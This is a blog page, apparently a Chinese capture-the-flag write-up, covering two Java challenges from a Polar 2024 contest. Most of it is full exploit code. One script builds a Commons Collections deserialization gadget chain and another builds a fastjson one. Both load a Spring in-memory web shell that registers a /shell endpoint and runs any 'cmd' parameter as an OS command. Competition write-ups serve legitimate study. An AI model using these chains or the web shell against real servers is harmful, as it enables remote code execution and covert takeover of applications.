@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ilikeoyt.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="cc链就是一个3.1的cc依赖，然后有个反序列化接口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Polar2024夏季赛-java题目">
+<meta property="og:url" content="https://ilikeoyt.github.io/2024/06/04/Polar2024%E5%A4%8F%E5%AD%A3%E8%B5%9B-java%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="ycx&#39;s blog">
+<meta property="og:description" content="cc链就是一个3.1的cc依赖，然后有个反序列化接口">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240603091639821.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240603091949158.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240603203843859.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240603225811866.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240603225959580.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240604190850104.png">
+<meta property="article:published_time" content="2024-06-04T11:10:21.000Z">
+<meta property="article:modified_time" content="2024-06-04T11:11:43.412Z">
+<meta property="article:author" content="ycxlo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/image-20240603091639821.png">
+
+<link rel="canonical" href="https://ilikeoyt.github.io/2024/06/04/Polar2024%E5%A4%8F%E5%AD%A3%E8%B5%9B-java%E9%A2%98%E7%9B%AE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Polar2024夏季赛-java题目 | ycx's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ycx's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2024/06/04/Polar2024%E5%A4%8F%E5%AD%A3%E8%B5%9B-java%E9%A2%98%E7%9B%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ycxlo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ycx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Polar2024夏季赛-java题目
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-06-04 19:10:21 / Modified: 19:11:43" itemprop="dateCreated datePublished" datetime="2024-06-04T19:10:21+08:00">2024-06-04</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="cc链"><a href="#cc链" class="headerlink" title="cc链"></a>cc链</h2><p>就是一个3.1的cc依赖，然后有个反序列化接口</p>
+<span id="more"></span>
+
+<p><img src="/image/image-20240603091639821.png" alt="image-20240603091639821"></p>
+<p>想直接利用cc1反弹shell，但是发现不出网，考虑spring内存马</p>
+<p>用cc6实例化字节码即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.polar.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, IOException, TransformerConfigurationException, Base64DecodingException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Repository.lookupClass(SpringMemShell.class).getBytes();</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="comment">//反射设置 Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Transformer数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformers);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tme,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        setFieldValue(transformers,<span class="string">&quot;iMethodName&quot;</span>,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        System.out.println(URLEncoder.encode(java.util.Base64.getEncoder().encodeToString(baos.toByteArray())));</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射设置 Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.polar.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMemShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span></span><br><span class="line">                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> SpringMemShell.class.getMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="type">SpringMemShell</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpringMemShell</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception hi) &#123;</span><br><span class="line"><span class="comment">//            hi.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我最开始其实是用cc3去打的，但是本地能打通，靶机始终注入不了，不太知道为啥…..</p>
+<p><img src="/image/image-20240603091949158.png" alt="image-20240603091949158"></p>
+<h2 id="ezjson"><a href="#ezjson" class="headerlink" title="ezjson"></a>ezjson</h2><p>一个反序列化点+fastjson依赖，很容易想到fastjson的原生反序列化，由于fastjson版本大于1.2.49，所以需要使用reference引用对象来进行绕过</p>
+<p>poc如下（依旧不出网）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.polar.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Base64DecodingException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, InvocationTargetException, IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Repository.lookupClass(SpringMemShell.class).getBytes();</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;useless&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>,  <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(templates,badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        System.out.println(URLEncoder.encode(java.util.Base64.getEncoder().encodeToString(barr.toByteArray())));</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/image-20240603203843859.png" alt="image-20240603203843859"></p>
